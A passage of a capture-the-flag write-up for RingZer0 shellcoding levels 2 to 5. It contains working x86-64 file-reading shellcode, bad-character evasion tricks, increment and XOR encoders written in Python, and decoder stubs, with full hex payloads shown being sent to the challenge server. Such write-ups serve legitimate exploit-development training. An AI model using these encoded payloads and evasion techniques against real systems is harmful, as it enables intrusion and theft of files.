class="pl-cce">\x</span>48<span class="pl-cce">\x</span>96<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>87<span class="pl-cce">\x</span>fe<span class="pl-cce">\x</span>6a<span class="pl-cce">\x</span>7f<span class="pl-cce">\x</span>5a<span class="pl-cce">\x</span>0f<span class="pl-cce">\x</span>05<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>31<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>ff<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>89<span class="pl-cce">\x</span>c7<span class="pl-cce">\x</span>0f<span class="pl-cce">\x</span>05
    Shellcode received...
    Shellcode length (49) bytes.

    Success: Executing shellcode...

/flag/level2.flag^@
FLAG-<span class="pl-k">&lt;</span>redacted<span class="pl-k">&gt;</span>
    Error: SIGSEGV received I think your shellcode is not working</pre></div>
<p>After succesfully executing the shellcode, it demands input on stdin. Specifically, it needs the filename which we want to read. Notice that the filename is terminated with a NULL byte: this can be done by typing in the correct filename and then pressing <code>Ctrl+Space</code> to send a NULL byte. When done, pressing enter will yield the flag!</p>
<h2><a id="user-content-level-3" class="anchor" aria-hidden="true" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md#level-3"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Level 3</h2>
<div class="highlight highlight-source-shell"><pre>This level have shellcode restriction. Bad char list <span class="pl-s"><span class="pl-pds">"</span>\x0a\x0d\x2f\x2e\x62\x48\x98\x99\x30\x31<span class="pl-pds">"</span></span> max size 50 bytes.
You main goal is to <span class="pl-c1">read</span> /flag/level3.flag</pre></div>
<p>Again, fifty bytes maximum shellcode length, but more bad chars have been added. Unfortunately, the bad chars <code>0x48</code> and <code>0x31</code> make the use of <code>xor rax, rax</code> and the like impossible! Instead, to zero a register, something like this can be done:</p>
<pre><code>push byte 1     ; 0x6a, 0x01
pop rbx         ; 0x5b
dec bl          ; 0xff
</code></pre>
<p>This effectively clears <code>rbx</code>. This register also typically keeps it's original value after a syscall (it's non-volatile), so it's a good place to store something we'll use more often.</p>
<p>Furthermore, I like to use <code>xchg</code> to swap around contents of registers. However, if this is done on full 64-bit registers, the assembler generates a <code>0x48</code> byte, which is a bad char. Instead, the values can be passed around via the stack:</p>
<pre><code>; instruction   ; opcode
; --------------|-------
push rax        ; 0x50
push rbx        ; 0x53
pop rax         ; 0x58
pop rbx         ; 0x5b
</code></pre>
<p>The effect of this is that <code>rax</code> now contains the value of <code>rbx</code> and vice-versa. Without further ado, the shellcode for level 3:</p>
<pre><code>bits 64

_start:

push byte 1
pop rbx
dec bl              ; rbx is now zeroed out, avoiding the bad chars 0x31 and 0x48. 

push rbx
pop rax             ; rax is now zeroed out too. 

push rbx
pop rdi             ; stdin is zero, so zero out rdi as well

push rsp            ; make rsi point to the top of the stack
pop rsi             ; the buffer for syscall read

push byte 18        ; read in 18 bytes
pop rdx
syscall

push rbx
pop rax
inc al
inc al              ; syscall open

;xchg rsi, rdi      ; we cannot use this xchg opcode because of 0x48!
push rdi            ; instead, do the exchange of rsi and rdi via the stack
push rsi
pop rdi             ; rdi is now pointing to the filename on the stack
pop rsi             ; rsi is now zero (flag O_RDONLY)

syscall
                    ; pull a similar trick here, swapping around three registers
push rax            ; fd of just opened file
push rsi            ; rsi = 0
push rdi            ; rdi = pointer to top of stack
pop rsi             ; rsi = buf
pop rax             ; rax = 0 syscall read
pop rdi             ; rdi = fd

push byte 127
pop rdx             ; amount of bytes to read
syscall             ; syscall read

push rbx
pop rax
inc al              ; syscall write
push rax            ; copy rax (==1) to rdi
pop rdi             ; 1 = stdout
                    ; rsi = still pointing to buffer with contents of file
                    ; rdx = still 0x7f
syscall
</code></pre>
<p>Assembling it:</p>
<div class="highlight highlight-source-shell"><pre>$ <span class="pl-c1">echo</span><span class="pl-k">;</span> nasm -f bin ./shellcode3.asm<span class="pl-k">;</span> xxd -c 1 ./shellcode3 <span class="pl-k">|</span> awk <span class="pl-s"><span class="pl-pds">'</span>{print "\\x"$2 }<span class="pl-pds">'</span></span> <span class="pl-k">|</span>tr -d <span class="pl-s"><span class="pl-pds">'</span>\n<span class="pl-pds">'</span></span><span class="pl-k">;</span> <span class="pl-c1">echo</span><span class="pl-k">;</span> wc -c ./shellcode3

<span class="pl-cce">\x</span>6a<span class="pl-cce">\x</span>01<span class="pl-cce">\x</span>5b<span class="pl-cce">\x</span>fe<span class="pl-cce">\x</span>cb<span class="pl-cce">\x</span>53<span class="pl-cce">\x</span>58<span class="pl-cce">\x</span>53<span class="pl-cce">\x</span>5f<span class="pl-cce">\x</span>54<span class="pl-cce">\x</span>5e<span class="pl-cce">\x</span>6a<span class="pl-cce">\x</span>12<span class="pl-cce">\x</span>5a<span class="pl-cce">\x</span>0f<span class="pl-cce">\x</span>05<span class="pl-cce">\x</span>53<span class="pl-cce">\x</span>58<span class="pl-cce">\x</span>fe<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>fe<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>57<span class="pl-cce">\x</span>56<span class="pl-cce">\x</span>5f<span class="pl-cce">\x</span>5e<span class="pl-cce">\x</span>0f<span class="pl-cce">\x</span>05<span class="pl-cce">\x</span>50<span class="pl-cce">\x</span>56<span class="pl-cce">\x</span>57<span class="pl-cce">\x</span>5e<span class="pl-cce">\x</span>58<span class="pl-cce">\x</span>5f<span class="pl-cce">\x</span>6a<span class="pl-cce">\x</span>7f<span class="pl-cce">\x</span>5a<span class="pl-cce">\x</span>0f<span class="pl-cce">\x</span>05<span class="pl-cce">\x</span>53<span class="pl-cce">\x</span>58<span class="pl-cce">\x</span>fe<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>50<span class="pl-cce">\x</span>5f<span class="pl-cce">\x</span>0f<span class="pl-cce">\x</span>05
47 ./shellcode3</pre></div>
<p>Haha! No bad chars <em>and</em> three bytes to spare!</p>
<h2><a id="user-content-level-4" class="anchor" aria-hidden="true" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md#level-4"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Level 4</h2>
<p>I wasn't laughing anymore once I saw the restrictions placed on the shellcode of level 4:</p>
<pre><code>This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x48" max size 80 bytes.
</code></pre>
<p>This bans the use of <code>syscall</code>, which assembles to <code>0x0f, 0x05</code>. In theory, I think <code>int 0x80</code> (<code>cd 80</code>) could be used, but I haven't verified. The shellcode needs to be obfuscated and decoded at runtime somehow. I decided to make a very simple encoding &amp; decoding system: the bytes are simply increased by one. At runtime, a small stub of code is responsible for decrementing each byte to it's proper value.</p>
<p>I've made use of a cool trick available on the 64-bit architecture: RIP-relative addressing. Normally, to get the address at which something is running, we'd do this:</p>
<pre><code>jmp _over_the_shellcode         ; jmp short, assembles to 0xeb + 8 bit signed displacement

_getInstructionPointer:
pop rbx                         ; rbx now contains the address of _location

; ...shellcode bytes...

_over_the_shellcode:
call _getInstructionPointer     ; call backward, assembles to 0xe8 and a 32 bit signed displacement

_location:
</code></pre>
<p>However, this <code>jmp/call/pop</code> sequence to get the current location of code would introduce <code>0xff</code> bytes due to the relative call backwards. We can't use this, but luckily RIP-relative addressing comes to the rescue!</p>
<pre><code>lea rax, [rel _shellcode]    ; notice the use of the rel keyword!

_shellcode:
</code></pre>
<p>Again, however, due to the nature of this instruction (it uses a 32-bit displacement value) this would introduce NULL bytes. Instead, I decided to offset the value with a constant and then subtracting that constant. Finally, I needed to select a proper register. I settled on <code>r14</code>, because <code>rax</code> through <code>rdi</code> would introduce bad chars, and so would <code>r15</code>.</p>
<p>The decoder looks like this:</p>
<pre><code>bits 64


default rel                         ; we'll use relative addressing to get RIP

_start:
                                    ; we use r14, because this will avoid the 0x48 byte
                                    ; lea eax/ecx etc emits 0x48
lea r14, [rel _shellcode+0x12345678]; we can't use it directly, because of null bytes.
sub r14, 0x12345678                 ; restore the value in r14, so it points to the encoded shellcode.

push byte 43                        ; put amount of bytes to decode
pop rcx                             ; in rcx

_decode:
dec byte [r14]                      ; start at r14 (_fakecall)
add r14, 1                          ; 'decode' by adding 1
loop _decode                        ; decode `ecx` bytes.

_shellcode:                         ; place 'encoded' shellcode here
</code></pre>
<p>The actual shellcode is nearly the same one used above. It reads in the name of the file you want to read (terminate with <code>^@</code> or <code>0x00</code> by typing Ctrl+space). It then opens that file, reads from it, storing the data on the stack. It finally writes the contents of the file back to us.</p>
<pre><code>bits 64

_start:

push byte 0         ; we can use 0 here because we add 1 to each 
                    ; byte in the shellcode to 'encode' it.
pop rbx             ; store this value in rbx. We'll re-use it later.
push rbx            ; copy rbx...
pop rax             ; ...to rax. rax is now 0, the syscall for 'read'
push rbx            ; copy rbx...
pop rdi             ; ...to rdi: fd = stdin 
push rsp            ; copy rsp to rsi
pop rsi             ; rsi is the buffer to which we read the filename to open
                    
push byte 18        ; the filename will be 18 bytes long
pop rdx             ; amount of byte to read
syscall             ; read in the filename

push rbx            ; rbx is still 0
pop rax             ; zero out rax
xor al, 2           ; syscall open. I had to use the xor here to avoid badchars after encoding this shellcode.
push rdi            ; switch around some registers. rdi = 0
push rsi            ; rsi = pointer to filename
pop rdi             ; rdi now points to filename to open
pop rsi             ; rsi = 0, which is O_RDONLY
syscall             ; open file

                    ; switch around the registers again. 
                    ; have to use the push/pops, because `xchg` would generate a badchar after encoding.
push rax            ; filehandle of just opened file
push rsi            ; rsi = 0
push rdi            ; rdi = pointer to top of stack
pop rsi             ; rsi = buf
pop rax             ; rax = 0 (syscall read)
pop rdi             ; rdi = filehandle
push byte 127       ; amount of bytes to read
pop rdx             ; in rdx
syscall             ; read in the contents of the file

push rbx            ; rbx is still 0
pop rax             ; zero out rax
xor al, 1           ; syscall write
push rax            ; copy rax to rdi
pop rdi             ; filehandle = 0 (stdout)
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; write to stdout; get me the flag!
ret                 ; return to handler program
</code></pre>
<p>Now, I could assemble these two shellcode pieces with <code>nasm</code>:</p>
<pre><code>$ nasm -f bin ./decoder.asm
$ nasm -f bin ./shellcode.asm
</code></pre>
<p>Then I wrote a small python program to do the actual encoding of the shellcode:</p>
<div class="highlight highlight-source-python"><pre>payload <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>

<span class="pl-c"><span class="pl-c">#</span> read in the decoder</span>
<span class="pl-k">with</span> <span class="pl-c1">open</span>(<span class="pl-s"><span class="pl-pds">'</span>decoder<span class="pl-pds">'</span></span>) <span class="pl-k">as</span> decoder:
    data <span class="pl-k">=</span> decoder.read()
    <span class="pl-k">for</span> i <span class="pl-k">in</span> data:
        payload <span class="pl-k">+=</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\\</span>x<span class="pl-c1">%02x</span><span class="pl-pds">"</span></span> <span class="pl-k">%</span> <span class="pl-c1">ord</span>(i)
    decoder.close()

<span class="pl-c"><span class="pl-c">#</span> read in the shellcode &amp; encode it</span>
<span class="pl-k">with</span> <span class="pl-c1">open</span>(<span class="pl-s"><span class="pl-pds">'</span>shellcode<span class="pl-pds">'</span></span>) <span class="pl-k">as</span> sc:
    data <span class="pl-k">=</span> sc.read()
    <span class="pl-c"><span class="pl-c">#</span> for each byte, we add 1 to it and emit it.</span>
    <span class="pl-k">for</span> i <span class="pl-k">in</span> data:
        payload <span class="pl-k">+=</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\\</span>x<span class="pl-c1">%02x</span><span class="pl-pds">"</span></span> <span class="pl-k">%</span> (<span class="pl-c1">ord</span>(i) <span class="pl-k">+</span> <span class="pl-c1">1</span>)
    sc.close()

<span class="pl-c"><span class="pl-c">#</span> spit out payload!</span>
<span class="pl-c1">print</span> payload</pre></div>
<p>After running this python script, I ended up with the completed shellcode:</p>
<div class="highlight highlight-source-python"><pre><span class="pl-ii">$</span> python .<span class="pl-k">/</span>encode.py 
\<span class="pl-ii">x4c\x8d\x35\x8b\x56\x34\x12\x49\x81\xee\x78\x56\x34\x12\x6a\x2b\x59\x41\xfe\x0e\x49\x83\xc6\x01\xe2\xf7\x6b\x01\x5c\x54\x59\x54\x60\x55\x5f\x6b\x13\x5b\x10\x06\x54\x59\x35\x03\x58\x57\x60\x5f\x10\x06\x51\x57\x58\x5f\x59\x60\x6b\x80\x5b\x10\x06\x54\x59\x35\x02\x51\x60\x10\x06\xc4</span></pre></div>
<p>As you can see, there are no badchars in this shellcode. We can send it over and grab the flag!</p>
<div class="highlight highlight-source-shell"><pre>RingZer0 Team CTF Shellcoding Level 4
Submit your shellcode using hex representation <span class="pl-s"><span class="pl-pds">"</span>\xcc\xcd<span class="pl-pds">"</span></span>.
Type <span class="pl-s"><span class="pl-pds">"</span>end<span class="pl-pds">"</span></span> to exit.

This level have shellcode restriction. Bad char list <span class="pl-s"><span class="pl-pds">"</span>\x0a\x0d\x2f\xff\x0f\x05\x48<span class="pl-pds">"</span></span> max size 80 bytes.
You main goal is to <span class="pl-c1">read</span> /flag/level4.flag

shellcode<span class="pl-k">&gt;</span><span class="pl-cce">\x</span>4c<span class="pl-cce">\x</span>8d<span class="pl-cce">\x</span>35<span class="pl-cce">\x</span>8b<span class="pl-cce">\x</span>56<span class="pl-cce">\x</span>34<span class="pl-cce">\x</span>12<span class="pl-cce">\x</span>49<span class="pl-cce">\x</span>81<span class="pl-cce">\x</span>ee<span class="pl-cce">\x</span>78<span class="pl-cce">\x</span>56<span class="pl-cce">\x</span>34<span class="pl-cce">\x</span>12<span class="pl-cce">\x</span>6a<span class="pl-cce">\x</span>2b<span class="pl-cce">\x</span>59<span class="pl-cce">\x</span>41<span class="pl-cce">\x</span>fe<span class="pl-cce">\x</span>0e<span class="pl-cce">\x</span>49<span class="pl-cce">\x</span>83<span class="pl-cce">\x</span>c6<span class="pl-cce">\x</span>01<span class="pl-cce">\x</span>e2<span class="pl-cce">\x</span>f7<span class="pl-cce">\x</span>6b<span class="pl-cce">\x</span>01<span class="pl-cce">\x</span>5c<span class="pl-cce">\x</span>54<span class="pl-cce">\x</span>59<span class="pl-cce">\x</span>54<span class="pl-cce">\x</span>60<span class="pl-cce">\x</span>55<span class="pl-cce">\x</span>5f<span class="pl-cce">\x</span>6b<span class="pl-cce">\x</span>13<span class="pl-cce">\x</span>5b<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>06<span class="pl-cce">\x</span>54<span class="pl-cce">\x</span>59<span class="pl-cce">\x</span>35<span class="pl-cce">\x</span>03<span class="pl-cce">\x</span>58<span class="pl-cce">\x</span>57<span class="pl-cce">\x</span>60<span class="pl-cce">\x</span>5f<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>06<span class="pl-cce">\x</span>51<span class="pl-cce">\x</span>57<span class="pl-cce">\x</span>58<span class="pl-cce">\x</span>5f<span class="pl-cce">\x</span>59<span class="pl-cce">\x</span>60<span class="pl-cce">\x</span>6b<span class="pl-cce">\x</span>80<span class="pl-cce">\x</span>5b<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>06<span class="pl-cce">\x</span>54<span class="pl-cce">\x</span>59<span class="pl-cce">\x</span>35<span class="pl-cce">\x</span>02<span class="pl-cce">\x</span>51<span class="pl-cce">\x</span>60<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>06<span class="pl-cce">\x</span>c4
    Shellcode received...
    Shellcode length (70) bytes.

    Success: Executing shellcode...

/flag/level4.flag^@
FLAG-<span class="pl-k">&lt;</span>redacted<span class="pl-k">&gt;</span>
Connection to shellcode.ringzer0team.com closed.</pre></div>
<h2><a id="user-content-level-5" class="anchor" aria-hidden="true" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md#level-5"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Level 5</h2>
<p>Of course, level 5 increases the bad char list even further...</p>
<pre><code>Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68" and \x40 to \x65 max size 100 bytes.
</code></pre>
<p>We can no longer use the relative addressing with <code>lea</code>, because of the bad chars <code>0x49</code> and <code>0x48</code>. In fact, I was unable to get the address of the shellcode via any techniques I know.</p>
<p>I assumed that this shellcode is being executed via a instruction like <code>call rax</code>. That means that <code>rax</code> would still contain the pointer to the shellcode. If this is the case, we can re-use the value in <code>rax</code> as an index to the shellcode and use it to carve out the 'real' shellcode via <code>xor</code> instructions. But let's first test this hypothesis. Time to get creative!</p>
<p>I made a small piece of shellcode that tests this hypothesis:</p>
<pre><code>bits 64

default rel

_start:
xor dword [rax+_temp-_start], 0x3d283d28        ; the xor will change the rets to jmp $-2!

nop
nop
nop
nop
nop
nop
nop

_temp:
ret
ret
ret
ret
</code></pre>
<p>When this code executes, the <code>xor</code> instruction should change the <code>ret</code> instructions to <code>jmp $-2</code>, or infinite loops (this works, because <code>c3 c3 c3 c3 xor 28 3d 28 3d</code> translates to <code>eb fe eb fe</code>). If <code>rax</code> does not point to the shellcode, I might get a SIGSEGV or the code simply exits.</p>
<p>Compiling it and sending it over, however, makes the program hang! This must means that the <code>ret</code>s were changed into <code>jmp</code> instructions, proving the hypothesis. We can use <code>rax</code> as a pointer to the shellcode! Now, we need to carve out the actual shellcode and execute it. I chose to use the same <code>xor</code> strategy. I made the <code>read/open/read/write</code> shellcode a lot smaller, managing to bring it down to 31 bytes. It contains bad chars again, but that's okay because I'm gonna encode it anyway:</p>
<pre><code>bits 64

_start:

xor rax, rax        ; syscall read
push rax
pop rdi             ; rdi: fd = stdin 
push rsp
pop rsi             ; rsi points to stack, aka a buffer
push byte 127
pop rdx             ; read 127 bytes
syscall

mov al, 2           ; open; because we read less than 128 bytes, the rest of rax/eax/ax/ah will contain zeroes.
xchg rsi, rdi       ; rsi is now zero (O_RDONLY) and rdi points to the filename on the stack
syscall             ; open the file

xchg rax, rdi       ; after this, rax = pointer to the stack, rdi = filehandle
xchg rax, rsi       ; after this, rax = 0, rsi = pointer to the stack
syscall             ; read

mov al, 1           ; again, less than 128 bytes will be read
push rax
pop rdi             ; fd = stdout
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; write out contents of flag to stdout!
</code></pre>
<p>Next, I needed to carve out this shellcode using <code>xor</code> instructions. These instructions must not contain bad chars. Luckily, <code>xor dword ptr [rax+offset]</code> itself does not contain bad chars, or they can be avoided.</p>
<div class="highlight highlight-source-python"><pre><span class="pl-k">import</span> struct

<span class="pl-s"><span class="pl-pds">'''</span> this function will try to locate a combination of two bytes that, when</span>
<span class="pl-s">    xor'ed, yield the required byte.</span>
<span class="pl-s"><span class="pl-pds">'''</span></span>
<span class="pl-k">def</span> <span class="pl-en">find_xor_bytes</span>(<span class="pl-smi">b</span>):
    <span class="pl-k">for</span> i <span class="pl-k">in</span> <span class="pl-c1">range</span>(<span class="pl-c1">256</span>):
        <span class="pl-k">if</span> i <span class="pl-k">not</span> <span class="pl-k">in</span> badchars:
            <span class="pl-k">if</span> <span class="pl-c1">ord</span>(b) <span class="pl-k">^</span> i <span class="pl-k">not</span> <span class="pl-k">in</span> badchars:
                <span class="pl-c"><span class="pl-c">#</span> return the two bytes that encode the required byte</span>
                <span class="pl-k">return</span> <span class="pl-c1">chr</span>(i), <span class="pl-c1">chr</span>(<span class="pl-c1">ord</span>(b) <span class="pl-k">^</span> i)
    <span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">"</span>cannot find proper byte for <span class="pl-c1">{}</span><span class="pl-pds">"</span></span>.format(b)
    <span class="pl-c1">exit</span>(<span class="pl-k">-</span><span class="pl-c1">1</span>)
    
<span class="pl-c"><span class="pl-c">#</span> build the bad char lookup array.</span>
badchars <span class="pl-k">=</span> [<span class="pl-c1"><span class="pl-k">0x</span>0</span>, <span class="pl-c1"><span class="pl-k">0x</span>a</span>, <span class="pl-c1"><span class="pl-k">0x</span>d</span>, <span class="pl-c1"><span class="pl-k">0x</span>2f</span>, <span class="pl-c1"><span class="pl-k">0x</span>ff</span>, <span class="pl-c1"><span class="pl-k">0x</span>f</span>, <span class="pl-c1"><span class="pl-k">0x</span>5</span>, <span class="pl-c1"><span class="pl-k">0x</span>68</span>]
<span class="pl-k">for</span> i <span class="pl-k">in</span> <span class="pl-c1">range</span>(<span class="pl-c1"><span class="pl-k">0x</span>40</span>, <span class="pl-c1"><span class="pl-k">0x</span>65</span>):
    badchars.append(i)
<span class="pl-c"><span class="pl-c">#</span> I got a bit paranoid and decided that these bytes were badchars too</span>
<span class="pl-k">for</span> i <span class="pl-k">in</span> <span class="pl-c1">range</span>(<span class="pl-c1"><span class="pl-k">0x</span>1</span>, <span class="pl-c1"><span class="pl-k">0x</span>f</span>):
    badchars.append(i)
    
<span class="pl-c"><span class="pl-c">#</span> read in the shellcode that we need to encode.</span>
<span class="pl-k">with</span> <span class="pl-c1">open</span>(<span class="pl-s"><span class="pl-pds">'</span>modified-shellcode3<span class="pl-pds">'</span></span>) <span class="pl-k">as</span> sc:
    data <span class="pl-k">=</span> sc.read()
    sc.close()

<span class="pl-c"><span class="pl-c">#</span> pad out the shellcode to a multiple of four</span>
<span class="pl-k">while</span> <span class="pl-c1">len</span>(data) <span class="pl-k">%</span> <span class="pl-c1">4</span>:
    data <span class="pl-k">+=</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\xc3</span><span class="pl-pds">"</span></span>

<span class="pl-c"><span class="pl-c">#</span> ill-named variables to hold the encrypted bytes</span>
storage <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
encoded_bytes <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
commands <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
defines <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
num_commands <span class="pl-k">=</span> <span class="pl-c1">0</span>

<span class="pl-c"><span class="pl-c">#</span> iterate over each byte in the shellcode</span>
<span class="pl-k">for</span> b <span class="pl-k">in</span> data:
    <span class="pl-c"><span class="pl-c">#</span> try to find two bytes that are not badchars themselves</span>
    (b1, b2) <span class="pl-k">=</span> find_xor_bytes(b)
    <span class="pl-c"><span class="pl-c">#</span> store those bytes</span>
    storage <span class="pl-k">+=</span> b1
    encoded_bytes <span class="pl-k">+=</span> b2
    <span class="pl-c"><span class="pl-c">#</span> if there are four bytes stored, add them to the output &amp; start again</span>
    <span class="pl-k">if</span> <span class="pl-c1">len</span>(storage) <span class="pl-k">==</span> <span class="pl-c1">4</span>:
        <span class="pl-c"><span class="pl-c">#</span> emit </span>
        commands <span class="pl-k">+=</span> <span class="pl-s"><span class="pl-pds">"</span>xor dword [rax+_shellcode<span class="pl-c1">{}</span>-_shellcode], <span class="pl-c1">{}</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>.format(num_commands, <span class="pl-c1">hex</span>(struct.unpack(<span class="pl-s"><span class="pl-pds">'</span>&lt;L<span class="pl-pds">'</span></span>, storage)[<span class="pl-c1">0</span>]))
        defines <span class="pl-k">+=</span> <span class="pl-s"><span class="pl-pds">"</span>_shellcode<span class="pl-c1">{}</span> dd <span class="pl-c1">{}</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>.format(num_commands, <span class="pl-c1">hex</span>(struct.unpack(<span class="pl-s"><span class="pl-pds">'</span>&lt;L<span class="pl-pds">'</span></span>, encoded_bytes)[<span class="pl-c1">0</span>]))
        storage <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
        encoded_bytes <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
        num_commands <span class="pl-k">+=</span> <span class="pl-c1">1</span>
                
<span class="pl-c"><span class="pl-c">#</span> output the resulting assembly </span>
<span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">"""</span>bits 64</span>
<span class="pl-s">_start:</span>
<span class="pl-s"></span>
<span class="pl-s">;mov rax, 10</span>
<span class="pl-s">;mov rdi, 0x400000</span>
<span class="pl-s">;mov rsi, 0x1000</span>
<span class="pl-s">;mov rdx, 7</span>
<span class="pl-s">;syscall</span>
<span class="pl-s">;lea rax, [_decoder]</span>
<span class="pl-s"></span>
<span class="pl-s">_shellcode:</span>
<span class="pl-s">jmp _decoder</span>
<span class="pl-s"><span class="pl-pds">"""</span></span>
<span class="pl-c1">print</span> defines
<span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">"</span>_decoder:<span class="pl-pds">"</span></span>
<span class="pl-c1">print</span> commands
<span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">"</span>jmp _shellcode0<span class="pl-pds">"</span></span>
</pre></div>
<p>This output the encoded shellcode as an assembly file. Using <code>nasm</code>, I could build it into shellcode again. For local testing, I included a call to <code>mprotect</code> and set the value of <code>rax</code> to the start of the shellcode, just like the situation on the remote server. The layout of the built shellcode (first encrypted bytes, then the decoder) is done on purpose: it avoids bad chars in the <code>xor dword [rax+offset]</code> instructions. The value for the offset should not be too high, as that would introduce bytes in the range <code>0x40</code> to <code>0x65</code>...</p>
<pre><code>bits 64
_start:

;mov rax, 10
;mov rdi, 0x400000
;mov rsi, 0x1000
;mov rdx, 7
;syscall
;lea rax, [_decoder]

_shellcode:
jmp _decoder
_shellcode0 dd 0x70d02169
_shellcode1 dd 0x7a7e747f
_shellcode2 dd 0x151f7a6f
_shellcode3 dd 0x976912a0
_shellcode4 dd 0x69151fe7
_shellcode5 dd 0x1f866987
_shellcode6 dd 0x7011a015
_shellcode7 dd 0xd3151f7f

_decoder:
xor dword [rax+_shellcode0-_shellcode], 0x20101021
xor dword [rax+_shellcode1-_shellcode], 0x10202020
xor dword [rax+_shellcode2-_shellcode], 0x10102010
xor dword [rax+_shellcode3-_shellcode], 0x10211010
xor dword [rax+_shellcode4-_shellcode], 0x21101010
xor dword [rax+_shellcode5-_shellcode], 0x10102110
xor dword [rax+_shellcode6-_shellcode], 0x20101010
xor dword [rax+_shellcode7-_shellcode], 0x10101020

jmp _shellcode0
</code></pre>
<p>Feeling quite chuffed, I assembled it and checked for bad chars... there was one! A <code>0x0a</code> byte snuck in. This was because the addresses of the encoded dwords were, relative to <code>rax</code>: 2, 6, 10, 14, etc. I needed to add an offset, which I did:</p>
<pre><code>_shellcode:
jmp _decoder
nop
nop
</code></pre>
<p>This took care of the problem. Yes, this shellcode could have been shorter, probably. A lot of the constants look similar, so I could have probably made the decoder smaller by selecting a 'magic' constant. However, it worked!</p>
<div class="highlight highlight-source-shell"><pre>$ <span class="pl-c1">echo</span><span class="pl-k">;</span> nasm -f bin ./completed2.asm<span class="pl-k">;</span> xxd -c 1 ./completed2 <span class="pl-k">|</span> awk <span class="pl-s"><span class="pl-pds">'</span>{print "\\x"$2 }<span class="pl-pds">'</span></span> <span class="pl-k">|</span>tr -d <span class="pl-s"><span class="pl-pds">'</span>\n<span class="pl-pds">'</span></span><span class="pl-k">;</span> <span class="pl-c1">echo</span><span class="pl-k">;</span> wc -c ./completed2

